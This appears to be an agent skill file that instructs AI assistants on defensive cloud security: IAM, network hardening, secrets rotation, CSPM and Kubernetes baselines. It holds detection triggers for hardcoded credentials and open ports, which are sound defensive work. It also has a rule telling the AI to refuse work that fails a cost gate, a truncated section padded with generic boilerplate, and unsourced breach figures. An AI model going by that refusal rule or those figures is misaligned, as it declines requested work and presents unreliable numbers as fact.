---
name: cloud-security
description: >
  Use when designing cloud IAM with least privilege across AWS/Azure/GCP, hardening cloud networks
  (VPC, security groups, WAF, DDoS), implementing secrets management with automatic rotation,
  automating cloud compliance (CIS, PCI DSS, HIPAA, SOC 2), evaluating CSPM/CNAPP tools (Wiz, Orca,
  Prisma Cloud), securing Kubernetes/container workloads, scanning IaC for misconfigurations, or
  conducting cloud incident response. Handles cloud IAM and secrets (AWS roles/SCPs, Azure PIM, GCP
  conditions, Vault, JIT creds), cloud networks (VPC/PrivateLink, NACLs, WAF, DDoS), Kubernetes
  security (Pod Security Standards, NetworkPolicy, etcd encryption, Cosign), IaC and compliance
  scanning (tfsec/checkov, cfn-nag, CIS via Prowler, OPA/Regula), cloud IR (CloudTrail forensics,
  GuardDuty, key rotation), and multi-cloud governance (federated identity, centralized SIEM). Do
  NOT use for cloud architecture (cloud-architect), appsec (security-engineer), IAM design
  (iam-architect), or compliance audit (compliance-officer).
license: MIT
author: Sandeep Kumar Penchala
type: security
status: stable
version: 1.0.0
updated: 2026-07-23
tags:
  - security
  - cloud-security
  - iam
  - secrets-management
  - compliance
  - cspm
  - kubernetes-security
  - iac-security
  - incident-response
  - multi-cloud
token_budget: 4500
chain:
  consumes_from:
    - cloud-architect
    - security-engineer
    - devops-engineer
  feeds_into:
    - security-engineer
    - incident-responder
    - compliance-officer
  alternatives: []
---
# Cloud Security
> **Portability target:** Spec-level (runs on Claude Code, Copilot, Gemini CLI, Codex, Cursor). No vendor-specific frontmatter fields.

End-to-end cloud security architecture -- from IAM least privilege design through incident response and multi-cloud governance. Covers cloud IAM hardening (AWS IAM roles/policies/boundaries/SCPs, Azure RBAC/PIM, GCP IAM conditions), network security architecture (VPC/VNet/VCN with private endpoints, layered security groups, WAF, DDoS), secrets management (automatic rotation, dynamic secrets, JIT credentials), compliance automation (CIS benchmarks, PCI DSS, HIPAA, SOC 2, compliance-as-code), CSPM/CNAPP tool evaluation, Kubernetes and container security, Infrastructure as Code (IaC) security scanning, and cloud-native incident response. Focus on defense-in-depth -- no single control should be the last line of defense.
<!-- QUICK: 30s -->

## Ground Rules — Read Before Anything Else
<!-- STANDARD: 3min -->

These rules are non-negotiable constraints that detect dangerous cloud security configurations before they are deployed. Violation means STOP and refuse to proceed.

| # | Negative Constraint | Mechanical Trigger | Violation Response |
|---|-------------------|-------------------|-------------------|
| R1 | REFUSE to hardcode credentials in source code, configuration, or environment variables. All secrets must use a managed secrets service. | Trigger: code or configuration contains `password=`, `secret_key=`, `AWS_SECRET_ACCESS_KEY=`, `AZURE_CLIENT_SECRET=`, `GCP_SA_KEY=`, private key PEM blocks, or connection strings with embedded credentials | STOP. Respond: "Hardcoded credentials are the #1 cause of cloud breaches. Replace with AWS Secrets Manager, Azure Key Vault, or GCP Secret Manager. For local development, use SSO/temporary credentials (aws sso login, az login, gcloud auth). Never commit credentials to git -- use .gitignore and pre-commit hooks (detect-secrets, git-secrets)." |
| R2 | REFUSE to open security groups or firewall rules to 0.0.0.0/0 for sensitive ports: 22 (SSH), 3389 (RDP), 3306 (MySQL), 5432 (PostgreSQL), 6379 (Redis), 27017 (MongoDB). | Trigger: security group or firewall rule contains `0.0.0.0/0` (or `::/0`) for destination ports 22, 3389, 3306, 5432, 6379, 27017, 1433, 1521, 9200, 5601 | STOP. Respond: "Security group ingress 0.0.0.0/0 on port {PORT} exposes {SERVICE} to the entire internet -- this is a $1M breach waiting to happen. Replace with specific CIDR ranges (VPN IPs, office IPs, VPC CIDR) or use AWS Systems Manager Session Manager / Azure Bastion / GCP IAP for administrative access. For databases, place in private subnets with no public IP." |
| R3 | REFUSE to allow public-writable S3 buckets, Azure Blob containers, or GCS buckets. No bucket/container should have public write access -- ever. | Trigger: S3 bucket ACL grants `WRITE` or `FULL_CONTROL` to `AllUsers` or `AuthenticatedUsers` group; Azure container public access level is `blob` or `container`; GCS bucket has `allUsers` with `WRITER` or `OWNER` role | STOP. Respond: "Public-writable storage is an immediate data breach risk. Attackers scan for writable buckets to host malware, phishing pages, or exfiltrate data. Block all public ACLs at the account level (S3 Block Public Access, Azure 'deny public blob access'). Use pre-signed URLs or CloudFront/OAuth for controlled access." |
| R4 | REFUSE to deploy production infrastructure without MFA on root/global admin accounts. No exceptions -- root user without MFA is indefensible. | Trigger: cloud account configuration shows root account MFA is `false` or `disabled`; IAM credential report shows root has access key; Azure Global Admin without Conditional Access MFA policy; GCP Super Admin without 2-Step Verification | STOP. Respond: "Root/global admin account without MFA is the single highest-value target in your cloud estate. Enable hardware MFA (YubiKey, Titan) for root. Delete all root access keys. Create IAM users/break-glass accounts for daily operations. Set up CloudTrail alerts for root activity. This takes 5 minutes and prevents catastrophic account takeover." |
| R5 | REFUSE to allow manual console changes in production environments. Infrastructure as Code (IaC) is mandatory for all production resources. | Trigger: proposed change involves clicking in the AWS/Azure/GCP console for a production resource AND no corresponding Terraform/CloudFormation/Pulumi/Bicep change exists | STOP. Respond: "Manual console changes in production create configuration drift, break audit trails, and prevent disaster recovery. All production changes must go through IaC (Terraform, CloudFormation, Pulumi, Bicep) with code review, CI/CD testing, and plan/apply approval gates. Emergency console access requires break-glass procedure with post-incident IaC reconciliation within 24 hours." |
| R6 | REFUSE to deploy without CloudTrail/audit logging enabled in all regions with log file validation, encryption, and multi-region aggregation. | Trigger: Terraform/CloudFormation/Bicep config for a new account/region lacks CloudTrail (AWS), Activity Log diagnostics + Sentinel (Azure), or Audit Logs + Log Router (GCP) configuration | STOP. Respond: "CloudTrail/audit logging is your last line of defense for incident investigation and compliance. Enable organization-wide trails with SSE-KMS encryption, log file validation (SHA-256 hashing), multi-region aggregation to a dedicated security S3 bucket with MFA-delete, and CloudWatch Logs integration. In Azure: enable Activity Log diagnostics with Log Analytics + Sentinel. In GCP: enable Audit Logs with log router to a secured sink." |
| **R7** | **ANCHOR to runtime versions before generating framework-specific code.** Never generate Fastify/Express/Django/FastAPI/Prisma/SQLAlchemy API calls from training data alone — your training data may be stale. | Trigger: skill receives code-generation task involving framework-specific APIs → run `scripts/runtime-version-detect.sh [project-root] --skill-context` to detect installed versions → if detection succeeds, anchor all API calls to detected versions → if detection fails, request version info from user | STOP. Respond: "Detected: {runtime}@{version}, {frameworks}@{versions}. Anchoring all API calls to these versions. I will add // VERIFY: comments on any API call where the detected version is newer than my training cutoff." |
| **R8** | **RUN the ROI Gate before any non-emergency code change.** Every code change that is not (a) a security fix, (b) a compliance requirement, or (c) an active production incident must pass `scripts/roi-gate.sh`. If the gate returns negative, refuse to write the code. | Trigger: skill receives a code-generation or refactoring task that is NOT a security fix, compliance requirement, or production incident → estimate implementation cost in engineer-hours → compare against annual value of the change → if cost > value, gate fails | STOP. Respond: "ROI Gate analysis: This change costs approximately $[X] to implement but saves $[Y]/year. Payback period: [N] years. If payback > 2 years, I recommend declining this work. See `scripts/roi-gate.sh` for the full formula." |

- **Admit uncertainty — never fabricate.** If you're not certain about an API method, package version, configuration syntax, or command flag, say so explicitly: "I'm not certain this API exists in the latest version. Check the official docs at [URL]." Never invent a function signature or configuration key because it "seems right." Hallucinated code costs hours of debugging.
- **Flag your knowledge cutoff.** If your training data predates the latest SDK release, framework version, or platform change, state your cutoff date and recommend verifying against current documentation. This is especially critical for rapidly evolving domains: cloud IAM policies, JS framework APIs, mobile OS capabilities, and SaaS pricing — all change quarterly or faster.
- **Never guess security configurations.** If you're unsure about the correct CSP header value, OAuth flow parameter, or encryption algorithm choice, do NOT provide a "reasonable default." Say: "Security configurations must be verified against current best practices at [official source]. I cannot provide a definitive answer without current documentation."
- **Distinguish between what you know and what you infer.** Explicitly mark statements as: [VERIFIED] — from official docs, [COMMON-PRACTICE] — widely used but not authoritative, [INFERRED] — your best guess based on patterns, [UNKNOWN] — you're unsure. This helps the user calibrate trust in your output.
## The Expert's Mindset
<!-- STANDARD: 3min -->

You are a cloud security architect operating with the assumption that your cloud environment is already compromised -- your job is to make that compromise irrelevant through layered defenses. Your mental model:

*   **Assume breach, design for containment.** Every architecture decision starts from the premise that an attacker already has a foothold. Design blast radiuses so small that no single compromise cascades. IAM boundaries, VPC segmentation, and service control policies are your blast walls.
*   **The cloud is programmable -- security should be too.** If you are clicking in a console, you are doing it wrong. Every security control -- IAM policies, security groups, WAF rules, compliance checks -- must be version-controlled, peer-reviewed, and deployed through CI/CD. Manual changes are unreviewable, unreproducible, and unrecoverable.
*   **Anti-rationalization: three illusions that precipitate cloud breaches.** (1) **Checkbox compliance:** "We passed the CIS benchmark scan" means you met a minimum bar on scan day. It does not mean every S3 bucket is configured correctly, every IAM policy is least-privilege, or every region has CloudTrail enabled. Compliance is a snapshot, not a state. (2) **Tool-completeness illusion:** Deploying AWS Security Hub + GuardDuty + Inspector does not make you secure — each has blind spots, each generates false negatives, and none replace human review of IAM policies and network configurations. Tools aggregate findings; they don't understand context. (3) **Perimeter fixation:** Thinking a VPC with private subnets and NAT Gateway is "secure" ignores that most cloud breaches come from valid IAM credentials making valid API calls to exfiltrate data — no network intrusion required. Cloud security is IAM security first, network security second.
*   **Least privilege is a journey, not a destination.** Start with zero permissions and add what is required. Use IAM Access Analyzer, policy simulator, and CloudTrail to continuously right-size permissions. Overly permissive policies rot over time -- review them quarterly with automated tools. Wildcard actions (`s3:*`, `ec2:*`) are technical debt — every `*` is a breach waiting to happen.
*   **Secrets are the keys to the kingdom.** A single leaked AWS access key or Azure service principal secret can result in a $50K+ cryptomining bill within hours. Secrets must never touch disk, never appear in environment variables, and must rotate automatically. The only secure secret is one that does not exist. Use OIDC federation to eliminate long-lived credentials entirely.
*   **Security is a speed multiplier, not a speed bump.** Teams that invest in security automation (IaC scanning, automated compliance, secrets management) ship faster than teams that do not -- because they spend less time fighting fires, remediating breaches, and passing audits retroactively.

## Operating at Different Levels
<!-- STANDARD: 3min -->

*   **Quick scan (30s):** Check for top cloud misconfigurations: public S3 buckets/containers, security groups open to 0.0.0.0/0 on sensitive ports, root account MFA status, CloudTrail/Audit Log enabled, IAM users with access keys older than 90 days, unencrypted EBS/RDS/S3 defaults. Flag any with severity: CRITICAL (fix within hours), HIGH (fix within 24h), MEDIUM (fix this sprint).
*   **Security assessment (10min):** Run automated CIS benchmark scan (Prowler for AWS, ScoutSuite for multi-cloud). Review IAM credential report, identify unused users/roles/keys. Check VPC flow logs enabled. Verify encryption at rest on all data stores. Audit secrets manager for rotation compliance. Score against CIS benchmark targets.
*   **Deep architecture review (full session):** Design cloud security reference architecture: account/organization structure with SCPs, IAM role hierarchy with permission boundaries, VPC design with private subnets and VPC endpoints, secrets management architecture with rotation schedules, compliance-as-code pipeline, CSPM/CNAPP deployment strategy, Kubernetes security baseline with admission control, IaC security scanning in CI/CD, incident response runbooks, and multi-cloud governance dashboard.
*   **Breach response mode:** Triage active cloud compromise: rotate all IAM keys immediately, isolate compromised resources via security group lockdown, enable enhanced logging (VPC Flow Logs, DNS query logs, CloudTrail Insights), snapshot compromised instances/databases for forensics, assess blast radius via IAM Access Analyzer, notify security team and cloud provider, preserve all logs with legal hold, begin root cause analysis. Goal is containment within 15 minutes of detection.

## When to Use
<!-- STANDARD: 3min -->

Use cloud-security when designing, reviewing, or hardening cloud infrastructure security across AWS, Azure, or GCP. The focus is on cloud-native security controls, infrastructure protection, and governance -- not application-level security or identity provider architecture.

*   Designing IAM least privilege: role-based access with trust policies, permission boundaries, SCPs, IAM conditions
*   Hardening cloud network security: VPC/VNet/VCN design, private endpoints, security groups, NACLs, WAF, DDoS
*   Implementing secrets management: automatic rotation with cloud-native services, dynamic secrets, JIT credential generation
*   Automating compliance: CIS benchmarks via Prowler/ScoutSuite, PCI DSS/HIPAA/SOC 2 control mapping, compliance-as-code
*   Evaluating CSPM/CNAPP tools: Wiz, Orca, Prisma Cloud, AWS Security Hub comparison, agentless vs agent-based
*   Securing Kubernetes/containers: Pod Security Standards, NetworkPolicy zero-trust, image signing, runtime protection
*   Scanning Infrastructure as Code: tfsec, checkov, terrascan, cfn-nag, cfn-guard, pre-commit hooks, CI/CD integration
*   Responding to cloud incidents: CloudTrail/Audit Logs forensics, GuardDuty/Security Command Center alerts, IAM key emergency rotation
*   Multi-cloud governance: federated identity, centralized SIEM logging, unified security posture dashboard

Do NOT use cloud-security for general cloud architecture design (route to cloud-architect). Do NOT use for application security -- WAF rules for app-layer attacks, API auth, code-level vulnerabilities (route to security-engineer). Do NOT use for identity provider design -- Okta, Azure AD tenant design, SAML federation (route to iam-architect). Do NOT use for compliance audit management -- evidence collection, auditor liaison, attestation letters (route to compliance-officer).

## Route the Request
<!-- STANDARD: 3min -->

### Auto-Route by Artifacts (Check Filesystem First)

| # | Condition | Action |
|---|-----------|--------|
| A1 | `file_contains("*.tf", "aws_iam|google_project_iam|azurerm_role")` OR `file_contains("*.tf", "iam_role|iam_policy|role_assignment")` | IAM design in progress -> Go to **Core Workflow: Phase 1 -- IAM Hardening** |
| A2 | `file_contains("*.tf", "aws_vpc|azurerm_virtual_network|google_compute_network|security_group|network_acl|waf")` | Network security design -> Go to **Core Workflow: Phase 2 -- Network Security Architecture** |
| A3 | `file_contains("*.tf", "aws_secretsmanager|azurerm_key_vault|google_secret_manager|vault")` OR `file_contains("*.yaml", "secret|Secret")` in Kubernetes manifests | Secrets management -> Go to **Core Workflow: Phase 3 -- Secrets Management** |
| A4 | `file_contains("*.tf", "aws_config|azure_policy|google_organization_policy|compliance")` OR file named `cis-*`, `compliance-*`, `pci-*` | Compliance automation -> Go to **Core Workflow: Phase 4 -- Compliance** |
| A5 | `file_contains("*.yaml", "kind: Pod|kind: Deployment|kind: NetworkPolicy")` OR `file_contains("Dockerfile")` | Container security -> Jump to **Decision Trees: Kubernetes Security Baseline** |
| A6 | `file_contains("*.tf")` OR `file_contains("*.yml", "checkov|tfsec|terrascan")` (in CI config) | IaC scanning -> Jump to **Decision Trees: IaC Security Pipeline Integration** |
| A7 | No cloud security files found | New cloud security engagement -> Go to **Core Workflow: Phase 1** |

### Intent Route (Ask the User)

```
What cloud security task are you working on?
|-- Hardening IAM permissions (roles, policies, least privilege) -> Start at "Core Workflow: Phase 1 -- IAM Hardening"
|-- Designing network security (VPCs, security groups, WAF, DDoS) -> Go to "Core Workflow: Phase 2 -- Network Security Architecture"
|-- Setting up secrets management (rotation, dynamic secrets) -> Go to "Core Workflow: Phase 3 -- Secrets Management"
|-- Automating cloud compliance (CIS, PCI, HIPAA, SOC 2) -> Go to "Core Workflow: Phase 4 -- Compliance Automation"
|-- Securing Kubernetes or container workloads -> Jump to "Decision Trees: Kubernetes Security Baseline"
|-- Scanning Infrastructure as Code for misconfigurations -> Jump to "Decision Trees: IaC Security Pipeline Integration"
|-- Evaluating CSPM/CNAPP tools -> Jump to "Decision Trees: CSPM Tool Selection"
|-- Responding to a cloud security incident -> Switch to Breach Response Mode (Operating at Different Levels)
|-- Building multi-cloud security governance -> Go to "Core Workflow: Phase 5 -- Workload Security"
|-- Complete cloud security architecture from scratch -> Start at "Core Workflow: Phase 1"
```

## Core Workflow **(STANDARD)**
<!-- STANDARD: 3min -->
<!-- COMPRESSED: Full 202 lines extracted to references/core-workflow.md -->

### Phase 1: IAM Hardening

Execute in order. Do not skip steps.

```
...
> 📎 **Full content (202 lines):** [references/core-workflow.md](references/core-workflow.md)
  Complete when: All IAM roles scoped to least privilege, zero standing admin access, MFA enforced on all human accounts, and IAM Access Analyzer confirms no overly permissive policies.
Complete when: All deliverables verified against acceptance criteria, stakeholder sign-off obtained, and documentation updated with final decisions and rationale.
Complete when: Risk register reviewed with mitigation owners assigned, residual risk levels within acceptable thresholds, and escalation paths documented for all identified risks.
Complete when: Quality gates passed: peer review completed, automated checks green, test coverage meets minimum thresholds, and no blocking issues remain open.
Complete when: Implementation validated against requirements with traceability matrix updated, edge cases tested, and rollback plan documented and rehearsed.
Complete when: Performance metrics baselined and monitored: key indicators within expected ranges, alerts configured for threshold breaches, and dashboard accessible to stakeholders.
Complete when: Knowledge transfer completed: documentation published, runbooks updated, team training conducted, and support handoff acknowledged by receiving team.
Complete when: Post-implementation review conducted: lessons learned documented, process improvements identified, and action items tracked with owners and due dates.

## Error Decoder — War Stories from the Trenches
<!-- STANDARD: 3min -->

**(STANDARD)**

When this domain goes wrong, it goes wrong in predictable ways. Here are the most common failure signatures, their root causes, and the fix you'll reach for after you've been burned once.

| Symptom | Root Cause | Fix | Lesson |
|---------|-----------|-----|--------|
| S3 bucket policy changed to `Allow *` — 500TB of customer data becomes publicly readable. No alert fires for 3 weeks | No CloudTrail alert configured for `PutBucketPolicy` or `PutBucketAcl` on sensitive-data buckets. CSPM was scanning weekly — bucket was public for 6 days before the scan ran | Configure real-time EventBridge rule: `PutBucketPolicy` or `PutBucketAcl` on any bucket tagged `sensitivity=high` → immediate Slack alert + auto-remediate. CSPM scan frequency must be continuous, not weekly, for storage services | A bucket can go public in 5 seconds but your scan runs every 7 days. For storage, detection latency must be measured in seconds, not days. Real-time event-driven detection beats scheduled scanning every time |
| IAM role with `AdministratorAccess` attached to an EC2 instance — developer "just needed it to work for the demo." Instance compromised 2 weeks later via unpatched library, attacker gets full AWS account access | No IAM policy guardrails. Developer had permission to attach any managed policy to any role. No Access Analyzer or IAM boundary enforcement | Apply SCP that denies `AdministratorAccess` attachment to any non-admin role. Use IAM Access Analyzer to detect overly permissive roles. Enforce permissions boundaries: "this role can never have more than S3 read + SQS write." Block `iam:Attach*Policy` for non-admin users on roles with sensitive permissions | Temporary convenience becomes permanent vulnerability. If a developer can grant admin access, they will. Guardrails must prevent the action, not just alert on it after the fact |
| KMS key deleted without grace period — all encrypted data (backups, logs, RDS snapshots) unrecoverable. 3 years of compliance-required audit logs gone | KMS key scheduled for deletion with default 7-day waiting period. No one noticed the CloudWatch alarm because it went to a distribution list nobody reads. Key deleted, data permanently lost | Extend KMS deletion window to 30 days minimum for production keys. Route deletion alarms to PagerDuty — not email. Require two-person approval for CMK deletion. Tag keys with data classification and retention requirements; block deletion if data hasn't met retention period | KMS key deletion is irreversible and silent — no "undo." The 7-30 day waiting period is your only safety net. Make sure someone is actually watching it |
| Security group opened to `0.0.0.0/0` on port 22 "temporarily for debugging" — still open 18 months later, discovered during audit | No automated remediation for overly permissive security groups. Engineers open ports for debugging and forget. Manual review is quarterly — a port can be open for 89 days before detection | Deploy AWS Config rule `restricted-ssh` with auto-remediation: revoke `0.0.0.0/0` ingress on port 22 and replace with specific office IP. Apply to all security groups every 5 minutes. Require JIT approval for any `0.0.0.0/0` ingress — approval auto-expires in 2 hours | "Temporary" in cloud security always means "permanent until the audit." If you make it easy to open, make it automatic to close. JIT access with auto-expiry is the only safe pattern |
| Multi-cloud: Azure resources not in scope of AWS CSPM — 3 storage accounts with public blob access, discovered during customer security review | CSPM tool (Wiz, Prisma) was configured for AWS only. Azure subscription was added later by a different team without updating security tooling. No unified cloud asset inventory | Build a single-pane cloud asset inventory that auto-discovers resources across all providers (AWS, Azure, GCP). CSPM must cover every active subscription/project. Run weekly cross-cloud reconciliation: "do we have CSPM coverage for every cloud account?" Alert on any unmonitored subscription within 24 hours of creation | What you can't see can (and will) be exploited. Multi-cloud means multi-CSPM. If your security tool only covers AWS, your Azure and GCP resources are the attacker's preferred entry point |
| Terraform state file stored in public S3 bucket — contains all infrastructure secrets (DB passwords, API keys, TLS private keys) in plaintext | Terraform backend configured with `bucket = "my-tfstate"` and no `acl = "private"`. State file written without encryption. Developer assumed S3 default was private — but account-level Block Public Access was disabled | Enable S3 Block Public Access at the account level — prevents any bucket from going public regardless of bucket-level settings. Encrypt state files with KMS. Use Terraform Cloud or remote backends that support encryption by default. Scan state files for secrets: `trufflehog filesystem tfstate/` in CI | Terraform state is a secrets database. Treat it like one: encrypted, access-controlled, and never in a public bucket. The entire infrastructure is one `terraform destroy` away from anyone who gets the state file |

## Best Practices
<!-- STANDARD: 3min -->

1. **Enforce IAM least privilege with continuous monitoring.** Start with deny-all policies and add only permissions proven necessary via IAM Access Analyzer or observed API call patterns. Use IAM conditions (`aws:SourceArn`, `aws:RequestedRegion`, `aws:MultiFactorAuthPresent`) to scope permissions. Review IAM credential reports quarterly — zero programmatic access keys older than 90 days. Use SSO federation for all human access; no IAM users with console access.
2. **Implement defense in depth with layered network controls.** Layer 1: WAF + DDoS protection at the edge. Layer 2: Security groups with no 0.0.0.0/0 on sensitive ports. Layer 3: NACLs as stateless backup. Layer 4: VPC endpoints for all AWS service traffic — no internet gateway for data plane communication. Layer 5: VPC Flow Logs to CloudWatch for network anomaly detection.
3. **Encrypt everywhere — at rest, in transit, and by default.** Enable EBS default encryption at the account level. Enable S3 default encryption with SSE-KMS. Require TLS 1.2+ for all service communication. Use KMS with automatic key rotation and key policies that enforce least privilege. Never accept unencrypted data stores — a single unencrypted EBS snapshot copied cross-account exposes all data in plaintext.
4. **Deploy CSPM for continuous misconfiguration detection.** Use AWS Security Hub, Wiz, Prisma Cloud, or Prowler to scan for CIS benchmark violations continuously. Configure auto-remediation for critical findings: public S3 buckets, security groups open to 0.0.0.0/0, unencrypted data stores, root account without MFA. CSPM must detect and alert within 15 minutes of a misconfiguration — not 24 hours.
5. **Enable and protect cloud audit logging everywhere.** CloudTrail in all regions with organization trail, SSE-KMS encryption, log file validation, and multi-region aggregation. VPC Flow Logs on every VPC. DNS query logging (Route 53 Resolver Query Logs). S3 data events on buckets containing sensitive data. CloudTrail data events cost $0.10/100K but missing them during a breach costs $1M+ in compliance fines and forensic blind spots.
6. **Use OIDC federation — never long-lived static credentials.** CI/CD pipelines authenticate to cloud providers via OIDC federation (GitHub Actions OIDC → AWS IAM, GCP Workload Identity Federation). No IAM access keys stored in CI secrets. No hardcoded credentials in `.env` files, Terraform state, or application config. A leaked long-lived credential is exploited within 5 minutes of hitting a public repo.
7. **Implement just-in-time access for privileged operations.** No standing administrative access. Privileged role elevation requires approval, is time-bound (1-4 hours), and is auto-revoked. Use Azure PIM, AWS IAM Identity Center permission sets, or GCP Privileged Access Manager. Every elevation event is logged and alertable. The break-glass procedure is documented, tested, and triggers immediate security review.
8. **Segment accounts by environment and function using AWS Organizations/Google Cloud folders.** Security OU for audit logs and security tooling. Prod OU for production workloads with restrictive SCPs. Dev OU for development with isolated blast radius. Apply SCPs that deny dangerous actions even for administrators: cannot leave the organization, cannot disable CloudTrail, cannot delete KMS keys, cannot create IAM users outside the identity account.
9. **Harden Kubernetes with Pod Security Standards, NetworkPolicy, and admission control.** Enforce restricted Pod Security Standard in production namespaces. Default-deny all ingress/egress with NetworkPolicy. Enable etcd encryption with KMS. Require image signing (cosign) and verify at admission control (Kyverno/Gatekeeper). Block privileged pods, host networking, and `:latest` tags.
10. **Scan Infrastructure as Code before deployment.** Run tfsec, checkov, or terrascan in CI on every PR. Block IaC changes that introduce security group 0.0.0.0/0 rules, unencrypted resources, public S3 buckets, or IAM wildcards. IaC security scanning must run in under 2 minutes — integrate as a pre-commit hook AND a CI gate.

## Decision Trees **(QUICK)**
<!-- STANDARD: 3min -->

### Cloud IAM Least Privilege Strategy

```

What type of identity needs access?
|-- Human user (developer, operator, admin)
|   |-- Federation-first: No IAM users -- use AWS SSO/Azure AD/GCP Workforce Identity
|   |-- Permission sets (AWS SSO): Predefined sets (DeveloperReadOnly, DeveloperPowerUser, SecurityAuditor, Administrator)
|   |-- JIT elevation: Azure PIM for privileged roles (activate for 1-4 hours, requires approval + MFA)
|   |-- Guardrails: SCP restricting actions even for admins (can't leave org, can't disable CloudTrail, can't delete KMS keys)
|-- Service/application
|   |-- Per-service role with exact ARN access: arn:aws:s3:::my-app-bucket/prefix/*
|   |-- Wildcard metrics: If role has "s3:*", flag as CRITICAL -- scope down to specific actions (s3:GetObject, s3:PutObject)
|   |-- Conditions: aws:SourceArn (only from specific Lambda/ECS), aws:SourceAccount, ec2:ResourceTag/Owner
|   |-- Permission boundaries: Set ceiling on maximum permissions regardless of role policy
|-- Cross-account access
|   |-- Role assumption only -- never share credentials
|   |-- ExternalId condition: Unique random string per trusting account (prevents confused deputy)
|   |-- Audit: CloudTrail shows sts:AssumeRole with roleSessionName identifying who assumed
|-- CI/CD pipeline
|   |-- OIDC federation: No long-lived access keys -- GitHub Actions/Actions OIDC -> AWS STS
|   |-- Token lifetime: max 1 hour (CI/CD typical), max 15 minutes (sensitive deployments)
|   |-- Condition: subject claim (repo:org/repo:ref:refs/heads/main, environment:production)

Policy right-sizing workflow:
|-- Run IAM Access Analyzer policy generation (analyzes CloudTrail to suggest minimum policy)
|   |-- Generated policy: Apply in "monitor" mode first (IAM Access Analyzer validates)
|   |-- After 14 days of no denied actions, enforce minimal policy
|   |-- Archive old policy version with timestamp and reason for rollback
|-- IAM policy > 100 lines = red flag
|   |-- Break into multiple roles (separation of duties)
|   |-- Use managed policies for common patterns, inline for exceptions
|-- Unused access: Access Analyzer unused access findings
|   |-- Service last used >90 days -> remove permission
|   |-- Action last used >90 days -> scope down
```

### Secrets Rotation Architecture

```

What type of secret needs rotation?
|-- Database credentials
|   |-- AWS RDS: Secrets Manager with multi-user rotation Lambda (creates alternating credential, tests, promotes)
|   |-- Azure SQL: Key Vault with Event Grid trigger + Azure Function for password reset
|   |-- GCP Cloud SQL: Secret Manager with Cloud Scheduler + Cloud Function (IAM database auth preferred)
|   |-- Rotation frequency: 30 days standard, 7 days for production financial databases
|   |-- Multi-user strategy: Two simultaneous valid credentials -- rotation can happen without downtime
|   |-- Monitoring: CloudWatch alarm if rotation fails >2x rotation window
|-- API keys (third-party services: Stripe, Twilio, SendGrid)
|   |-- Store in Secrets Manager/Key Vault/Secret Manager
|   |-- Rotation: Manual rotation via Lambda/Function with API key refresh + verify + commit
|   |-- Frequency: 90 days standard, 30 days for payment APIs
|   |-- Canary deployment: New key tested on 1% traffic before full cutover
|-- TLS/SSL certificates
|   |-- ACM (AWS): Automatic renewal with DNS validation, deployed to CloudFront/ALB/API Gateway
|   |-- Azure App Service Managed Certificates: Free, auto-renewing
|   |-- GCP Managed SSL Certificates: Auto-renewing for load balancers
|   |-- Internal PKI: HashiCorp Vault PKI engine -- short-lived certs (24-72h), auto-renewed by cert-manager
|   |-- Expiry alert: 30 days, 14 days, 7 days, 3 days, 1 day before expiry
|-- IAM access keys / service principal secrets
|   |-- ELIMINATE entirely: Use OIDC federation for CI/CD, IAM roles for EC2/Lambda/EKS
|   |-- If absolutely required: 90-day rotation, maximum 1 key per user, CloudWatch alarm on age >90 days
|   |-- Emergency rotation: Immediate in case of suspected compromise -- deactivate first, then rotate
```

### CSPM Tool Selection

```

What are your primary security requirements?
|-- Cloud-native, single cloud (AWS only)
|   |-- AWS Security Hub + GuardDuty + Inspector + Config + IAM Access Analyzer
|   |-- Prowler for CIS benchmarks (open source, 300+ checks)
|   |-- Total: $1-3K/month for moderate environments (30-100 accounts)
|   |-- Pros: Native integration, no agent, pay-per-use pricing
|   |-- Cons: AWS-only, limited multi-cloud, less contextual prioritization than CNAPP
|-- Multi-cloud (AWS + Azure + GCP)
|   |-- Wiz: Agentless API-based scanning, vulnerability prioritization with cloud context, infrastructure-as-code scanning
|   |-- Orca Security: SideScanning technology (agentless, reads cloud runtime block storage), attack path analysis
|   |-- Prisma Cloud (Palo Alto): Agent-based (Defender) for runtime, agentless for posture, full CNAPP
|   |-- Pricing: $30K-$150K/year depending on cloud spend and features
|-- Kubernetes-first, container-heavy
|   |-- Wiz or Orca for cloud + container posture
|   |-- Aqua Security / Sysdig / Snyk: Deep container security (image scanning, runtime, admission control)
|   |-- Falco + Tetragon: Open-source runtime security (syscall monitoring, eBPF enforcement)
|   |-- Kyverno / OPA Gatekeeper: Kubernetes-native policy enforcement, admission control
|-- Budget-constrained, open-source preferred
|   |-- Prowler + ScoutSuite + CloudMapper (AWS) for compliance and network mapping
|   |-- Trivy (Aqua Security, open source): Container image + IaC + Kubernetes misconfiguration scanning
|   |-- Checkov (Bridgecrew/Palo Alto, open source): IaC scanning (Terraform, CloudFormation, Kubernetes, Helm, ARM, Bicep)
|   |-- Falco: Runtime threat detection (CNCF graduated)
|   |-- Combined: Run in CI/CD pipeline + scheduled daemon -> centralized findings in Security Hub (free)
|   |-- Cost: Infrastructure cost only (compute + storage for scanning tools, ~$100-500/month)

Agentless vs Agent-based evaluation:
|-- Agentless (Wiz, Orca, Security Hub)
|   |-- Pros: Zero deployment overhead, covers 100% of resources instantly, no performance impact
|   |-- Cons: Limited runtime visibility, can't detect in-memory threats, scan frequency = API polling interval
|-- Agent-based (Prisma Cloud Defender, CrowdStrike, Sysdig)
|   |-- Pros: Runtime threat detection, process monitoring, network traffic analysis, in-memory forensics
|   |-- Cons: Deployment overhead, performance impact (1-5% CPU), agent lifecycle management, potential blind spots on unmanaged instances
|-- Recommended: Agentless for posture management (compliance, misconfigs, vulnerabilities) + agent-based for runtime protection (threat detection on production workloads)
```

### Kubernetes Security Baseline

```

Deployment hardening sequence:
|-- 1. Pod Security Standards (PSS) enforcement
|   |-- Level: restricted (maximum security) for production clusters
|   |   |-- Blocks: privileged containers, hostNetwork, hostPID, hostPath volumes, non-root users, capabilities
|   |   |-- Enforces: runAsNonRoot: true, readOnlyRootFilesystem: true, seccompProfile RuntimeDefault
|   |-- Level: baseline for build/test clusters (minimum viable security)
|   |-- Enforcement: Built-in PSS admission controller (K8s 1.25+) or Kyverno/Gatekeeper for older versions
|   |-- Migration path: Audit mode (warn) -> Enforce mode (deny + audit) over 2-4 weeks
|-- 2. NetworkPolicy zero-trust design
|   |-- Default deny-all ingress and egress per namespace
|   |-- Explicit allow: DNS (kube-dns on UDP 53), API server (from selected pods only)
|   |-- Namespace isolation: Deny cross-namespace traffic by default, allow specific namespaces via networkPolicy
|   |-- External egress: Allow only to known external services (Cloud SQL IP, S3 CIDRs, VPC endpoint IPs)
